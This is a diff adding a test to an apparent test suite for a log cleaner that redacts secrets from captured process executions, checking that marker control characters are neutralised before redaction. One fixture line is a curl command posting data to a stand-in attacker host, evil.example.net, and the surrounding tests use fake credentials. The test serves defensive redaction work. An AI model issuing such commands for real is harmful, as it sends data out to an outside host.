@@ -2655,6 +2655,26 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
     }
   });
 
+  // Review round 1, I6: the characters the cleaner uses as markers (U+0001, U+0002) in a capture are U+FFFD before any
+  // step, so they cannot hide a credential or a body.
+  test('marker characters in a capture are replaced before cleaning', () => {
+    const input = [
+      run(1800, '/usr/local/bin/tool', ['tool', '--password=a\u0002pwSS'], '/', 1),
+      run(1801, '/usr/bin/curl', ['curl', '-d', 'q=Board\u0002TT', 'https://evil.example.net'], '/', 2),
+      run(1802, '/bin/echo', ['echo', 'x\u0001y'], '/', 3),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      const d = keyed(r.key, 'data');
+      expect(args[0]).toEqual(['tool', '--password=<redacted>']);
+      expect(args[1]).toEqual(['curl', '-d', d.get('q=Board\ufffdTT'), 'https://evil.example.net']);
+      expect(args[2]).toEqual(['echo', 'x\ufffdy']);
+      expect(r.out).not.toMatch(/pwSS|Board|[\u0001\u0002]/);
+      cleanKey(r.key);
+      sameFindings(input, r.out);
+    }
+  });
+
   test('environment values are redacted, except the useful ones', () => {
     const env = ['AWS_SESSION_TOKEN=FQoGZXIvYXdzEJr', 'MY_VAR=Board', 'PATH=/Users/jdoe/bin:/usr/bin',
       'DYLD_INSERT_LIBRARIES=/Users/jdoe/lib/x.dylib', 'HOME=/Users/jdoe', 'LC_ALL=en_US.UTF-8', 'TERM=xterm-256color',
